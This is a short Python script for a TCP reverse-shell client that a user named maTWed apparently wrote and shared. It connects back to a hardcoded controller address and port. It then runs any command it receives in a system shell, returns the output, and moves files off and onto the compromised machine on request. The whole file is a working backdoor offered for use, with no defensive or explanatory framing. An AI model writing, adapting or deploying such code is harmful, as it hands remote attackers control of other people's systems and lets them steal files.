#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# Client-tcp-revshell - quick and simple. Does File uploads/downloads
# by: maTWed
# Change ip addr and port located in connection()

from socket import *
import subprocess
import os

def file_down(s,filename):

    if os.path.exists(filename):
        f = open(filename, 'r')
        packet = f.read(1024)

        while (packet):
            s.send(packet)
            packet = f.read(1024)
        f.close()
        s.send('DONE')

    else:
        s.send('File not found!')


def file_up(s,filename):

    f = open(filename, 'w')
    while True:
        packet = s.recv(1024)

        while (packet):

            if packet.endswith('DONE'):

                if 'DONE' in packet:
                    packet = packet.replace('DONE', '')
                f.write(packet)
                s.send('COMPLETE')
                break

            else:
                f.write(packet)
                packet = s.recv(1024)

        break
    f.close()


def connection():
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('192.168.0.31', 1338))       # Change me

    while True:
        cmd = s.recv(1024)

        if 'quit' in cmd:
            s.close()
            break

        elif 'download' in cmd:
            filename = cmd[9:]
            try:
                file_down(s,filename)
            except Exception as e:
                s.send (str(e))
                pass

        elif 'upload' in cmd:
            filename = cmd[7:]
            try:
                file_up(s,filename)
            except Exception as e:
                s.send (str(e))
                pass

        elif 'cd' in cmd:
            direc = cmd[3:]
            try:
                os.chdir(direc)
                s.send ('[+] pwd ' + os.getcwd())
            except Exception as e:
                s.send (str(e))
                pass

        else:
            CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connection()
main()
